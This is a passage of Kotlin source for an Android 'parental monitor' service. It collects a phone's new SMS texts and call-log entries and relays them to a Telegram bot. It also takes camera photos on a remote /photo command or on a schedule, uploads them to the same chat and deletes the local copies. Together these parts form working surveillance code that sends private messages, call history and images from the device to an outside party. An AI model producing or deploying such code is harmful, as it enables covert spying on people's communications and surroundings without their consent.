                    preferencesManager.lastCallId = latest.id
                    if (index < chunks.size - 1) delay(500)
                }
                if (page.size < 500) break
                pages++
            }
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error checking new data", e)
        }
    }

    private fun formatSmsMessage(smsList: List<com.redeye.parentalmonitor.data.models.SmsData>): String {
        return buildString {
            appendLine("💬 <b>New SMS (${smsList.size})</b>")
            appendLine()
            
            smsList.forEach { sms ->
                appendLine("📞 Number: ${escapeHtml(sms.address)}")
                val body = escapeHtml(sms.body.take(200)) // Limit to 200 chars
                appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
                appendLine("🔄 Type: ${sms.getTypeString()}")
                appendLine("⏰ Time: ${formatDate(sms.date)}")
                appendLine("━━━━━━━━━━━━━━━━")
            }
        }
    }

    private fun formatCallMessage(callList: List<com.redeye.parentalmonitor.data.models.CallData>): String {
        return buildString {
            appendLine("📞 <b>New calls (${callList.size})</b>")
            appendLine()
            
            callList.forEach { call ->
                appendLine("📱 Number: ${escapeHtml(call.number)}")
                if (call.name != null) {
                    appendLine("👤 Name: ${escapeHtml(call.name)}")
                }
                appendLine("🔄 Type: ${call.getTypeString()}")
                appendLine("⏱️ Duration: ${call.getDurationString()}")
                appendLine("⏰ Time: ${formatDate(call.date)}")
                appendLine("━━━━━━━━━━━━━━━━")
            }
        }
    }

    private fun safeCut(text: String, max: Int): Int {
        if (text.length <= max) return text.length
        var cut = max
        if (Character.isHighSurrogate(text[cut - 1]) && Character.isLowSurrogate(text[cut])) cut -= 1
        val amp = text.lastIndexOf('&', cut - 1)
        if (amp >= 0 && amp > cut - 12) {
            val semi = text.indexOf(';', amp)
            if (semi < 0 || semi >= cut) {
                val entity = text.substring(amp, cut)
                if (entity.all { it.isLetterOrDigit() || it == '&' || it == '#' }) cut = amp
            }
        }
        if (cut <= 0) cut = max
        return cut
    }
    private suspend fun sendFitted(message: String) {
        if (message.length <= 4000) {
            sendToTelegram(message)
            return
        }
        val lines = message.split("\n")
        var current = StringBuilder()
        for (line in lines) {
            var rest = line
            while (rest.length > 4000) {
                if (current.isNotEmpty()) {
                    sendToTelegram(current.toString())
                    delay(500)
                    current = StringBuilder()
                }
                val cut = safeCut(rest, 4000)
                sendToTelegram(rest.substring(0, cut))
                delay(500)
                rest = rest.substring(cut)
            }
            if (current.length + rest.length + 1 > 4000) {
                if (current.isNotEmpty()) {
                    sendToTelegram(current.toString())
                    delay(500)
                }
                current = StringBuilder()
            }
            if (current.isNotEmpty()) current.append("\n")
            current.append(rest)
        }
        if (current.isNotEmpty()) sendToTelegram(current.toString())
    }

    private suspend fun sendToTelegram(
        message: String,
        replyMarkup: com.redeye.parentalmonitor.network.InlineKeyboardMarkup? = null
    ) {
        try {
            if (message.length > 4096) {
                android.util.Log.e("MonitoringService", "Message too long: ${message.length} chars, splitting")
                sendFitted(message)
                return
            }
            
            val (botToken, chatId) = sendCreds()

            if (botToken.isEmpty() || chatId.isEmpty()) {
                android.util.Log.e("MonitoringService", "Bot token or chat ID is empty!")
                return
            }

            val hasNetwork = hasNetwork()
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Network available: $hasNetwork")
            
            if (!hasNetwork) {
                // No internet, add to queue
                android.util.Log.w("MonitoringService", "No network, adding to queue")
                messageQueue.addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
                return
            }

            val telegramMessage = TelegramMessage(
                chatId = chatId,
                text = message,
                parseMode = "HTML",
                replyMarkup = replyMarkup
            )

            val url = "https://api.telegram.org/bot${botToken}/sendMessage"
            val response = TelegramClient.api.sendMessage(url, telegramMessage)

            if (response.isSuccessful && response.body()?.ok == true) {
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Message sent")
                preferencesManager.lastSyncTime = System.currentTimeMillis()
                try {
                    preferencesManager.credentialError = ""
                    preferencesManager.credentialErrorAt = 0L
                } catch (_: Exception) {
                }
            } else if (response.code() == 429) {
                val retryAfter = NetworkUtils.parseRetryAfter(response.errorBody()?.string())
                android.util.Log.w("MonitoringService", "Rate limited, will retry via queue after ${retryAfter}s")
                messageQueue.addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
            } else if (response.code() == 400 || response.code() == 401 || response.code() == 403) {
                android.util.Log.e("MonitoringService", "Auth rejected (${response.code()}), not queuing")
                try {
                    preferencesManager.credentialError = response.code().toString()
                    preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
                } catch (_: Exception) {
                }
            } else {
                android.util.Log.e("MonitoringService", "✗ Failed to send: ${response.code()}")
                messageQueue.addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
            }
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "✗ Exception sending message: ${redactToken(e.message)}", e)
            messageQueue.addMessage(message)
            MessageScheduler.scheduleMessageSend(this)
        }
    }

    private fun syncIntervalMillis(): Long {
        return preferencesManager.syncInterval.coerceIn(1, 1440) * 60_000L
    }

    private fun formatDate(timestamp: Long): String {
        return TimeFmt.full(timestamp)
    }

    private fun stopMonitoring() {
        monitoringJob?.cancel()
        cameraJob?.cancel()
        commandJob?.cancel()
        initialSyncJob?.cancel()
        initialSyncRunning.set(false)
        watchdogJob?.cancel()
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        try { credsListener?.let { preferencesManager.unregisterChangeListener(it) } } catch (_: Exception) { }
        super.onDestroy()
        serviceScope.cancel()
    }
    
    // ═══════════════════════════════════════════════════════════
    // CAMERA MONITORING FUNCTIONS
    // ═══════════════════════════════════════════════════════════
    
    private fun captureAndSendPhoto(reportResult: Boolean = false) {
        if (pendingPhotoCount() >= 10) {
            prunePhotoCache()
            serviceScope.launch {
                if (reportResult) {
                    sendToTelegram("⚠️ Photo backlog full (offline). Oldest unsent kept; newest capture skipped.")
                } else {
                    notifyCameraFailure("photo backlog full")
                }
            }
            return
        }
        if (!hasCameraPermission()) {
            serviceScope.launch {
                if (reportResult) {
                    sendToTelegram("⚠️ Photo capture failed: camera permission missing. Open Setup and grant Camera permission.")
                } else {
                    notifyCameraFailure("camera permission missing")
                }
            }
            return
        }
        if (!cameraBusy.compareAndSet(false, true)) {
            if (reportResult) {
                serviceScope.launch {
                    sendToTelegram("⚠️ Camera is busy, please try /photo again in a moment.")
                }
            }
            return
        }
        watchdogJob?.cancel()
        val attempt = cameraAttempt.incrementAndGet()
        watchdogJob = serviceScope.launch {
            delay(50_000)
            if (cameraAttempt.get() == attempt && cameraBusy.compareAndSet(true, false)) {
                android.util.Log.w("MonitoringService", "Camera watchdog: capture did not finish, flag reset")
                if (reportResult) {
                    sendToTelegram("⚠️ Photo capture timed out without a response. Please try /photo again.")
                }
            }
        }
        try {
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "📸 Starting camera capture...")
            cameraService.capturePhoto(
                lensFacing = selectedLensFacing(),
                onPhotoTaken = { photoFile ->
                    cameraAttempt.incrementAndGet()
                    cameraBusy.set(false)
                    watchdogJob?.cancel()
                    serviceScope.launch {
                        val sent = sendPhotoFile(photoFile)
                        if (sent) {
                            flushPendingPhotos()
                        } else {
                            prunePhotoCache()
                            if (reportResult) {
                                sendToTelegram("⚠️ Photo captured but upload failed. File kept for retry.")
                            }
                        }
                    }
                },
                onError = { exception ->
                    cameraAttempt.incrementAndGet()
                    cameraBusy.set(false)
                    watchdogJob?.cancel()
                    android.util.Log.e("MonitoringService", "✗ Camera capture failed: ${exception.message}")
                    serviceScope.launch {
                        if (reportResult) {
                            val hint = if (!hasCameraPermission()) {
                                "Open Setup and grant Camera permission."
                            } else {
                                "The camera may be in use by another app."
                            }
                            sendToTelegram("⚠️ Photo capture failed: ${exception.message ?: "unknown error"}. $hint")
                        } else {
                            notifyCameraFailure(exception.message ?: "unknown error")
                        }
                    }
                }
            )
        } catch (e: Exception) {
            cameraAttempt.incrementAndGet()
            cameraBusy.set(false)
            watchdogJob?.cancel()
            android.util.Log.e("MonitoringService", "✗ Error in captureAndSendPhoto", e)
            serviceScope.launch {
                if (reportResult) {
                    sendToTelegram("⚠️ Photo capture failed: ${e.message ?: "unknown error"}.")
                } else {
                    notifyCameraFailure(e.message ?: "unknown error")
                }
            }
        }
    }
    
    private suspend fun notifyCameraFailure(reason: String) {
        try {
            val now = android.os.SystemClock.elapsedRealtime()
            val last = preferencesManager.lastCameraErrorNotice
            if (last in 1L..999_999_999_999L && now - last < 30 * 60_000L) return
            preferencesManager.lastCameraErrorNotice = now
            val hint = if (!hasCameraPermission()) {
                "Camera permission is missing — open Setup and grant it."
            } else {
                "The camera may be in use by another app."
            }
            sendToTelegram("⚠️ Photo capture failed: $reason. $hint")
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error sending camera notice", e)
        }
    }

    private suspend fun notifyPhotoSendFailure(detail: String) {
        try {
            val now = android.os.SystemClock.elapsedRealtime()
            val last = preferencesManager.lastUploadErrorNotice
            if (last in 1L..999_999_999_999L && now - last < 30 * 60_000L) return
            preferencesManager.lastUploadErrorNotice = now
            sendToTelegram("⚠️ Photo upload failed ($detail). Will retry automatically.")
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error sending upload notice", e)
        }
    }

    private fun hasCameraPermission(): Boolean {
        return androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.CAMERA
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun pendingPhotoCount(): Int {
        return try {
            cacheDir.listFiles { file ->
                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
            }?.size ?: 0
        } catch (_: Exception) {
            0
        }
    }

    private suspend fun sendPhotoToTelegram(photoFile: File) {
        if (sendPhotoFile(photoFile)) {
            flushPendingPhotos()
        } else {
            prunePhotoCache()
        }
    }

    private suspend fun sendPhotoFile(photoFile: File): Boolean {
        try {
            if (!hasNetwork()) {
                android.util.Log.w("MonitoringService", "No network - photo saved for later")
                return false
            }

            val (botToken, chatId) = sendCreds()

            if (botToken.isEmpty() || chatId.isEmpty()) {
                android.util.Log.e("MonitoringService", "Bot credentials missing")
                return false
            }

            val requestFile = photoFile.asRequestBody("image/jpeg".toMediaTypeOrNull())
            val photoPart = MultipartBody.Part.createFormData("photo", photoFile.name, requestFile)
            val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())

            val timestamp = TimeFmt.full(System.currentTimeMillis())
            val caption = "📸 $timestamp".toRequestBody("text/plain".toMediaTypeOrNull())

            val url = "https://api.telegram.org/bot$botToken/sendPhoto"

            val response = TelegramClient.api.sendPhoto(url, chatIdBody, caption, photoPart)

            if (response.isSuccessful && response.body()?.ok == true) {
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "✓ Photo sent successfully!")
                preferencesManager.lastSyncTime = System.currentTimeMillis()
                preferencesManager.lastPhotoTime = System.currentTimeMillis()
                secureDelete(photoFile)
                return true
            }
            val errorBody = try {
                response.errorBody()?.string()?.take(200) ?: ""
            } catch (e: Exception) {
                ""
            }
            if (response.code() == 429) {
                android.util.Log.w("MonitoringService", "Photo rate limited, keeping file for retry")
            } else if (response.code() == 400 || response.code() == 401 || response.code() == 403) {
                android.util.Log.e("MonitoringService", "Photo auth rejected (${response.code()}), dropping file")
                try {
                    preferencesManager.credentialError = response.code().toString()
                    preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
                } catch (_: Exception) {
                }
                secureDelete(photoFile)
            } else {
                android.util.Log.e("MonitoringService", "✗ Failed to send photo: ${response.code()} $errorBody")
                notifyPhotoSendFailure("HTTP ${response.code()} $errorBody".trim())
            }
            return false
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "✗ Error sending photo to Telegram", e)
            return false
        }
    }

    private suspend fun flushPendingPhotos(max: Int = 10) {
        val pending = try {
            cacheDir.listFiles { file ->
                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
            }?.sortedBy { it.lastModified() }?.take(max) ?: return
        } catch (e: Exception) {
            return
        }
        for (file in pending) {
            if (!sendPhotoFile(file)) break
            kotlinx.coroutines.delay(500)
        }
        prunePhotoCache()
    }

    private fun secureDelete(file: File) {
        try {
            file.delete()
        } catch (_: Exception) {
        }
    }
    private fun prunePhotoCache(maxKept: Int = 10) {
        try {
            val photos = cacheDir.listFiles { file ->
                file.isFile && file.name.startsWith("camera_") && file.name.endsWith(".jpg")
            }?.sortedBy { it.lastModified() } ?: return
            photos.drop(maxKept).forEach { secureDelete(it) }
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error pruning photo cache", e)
        }
    }
}
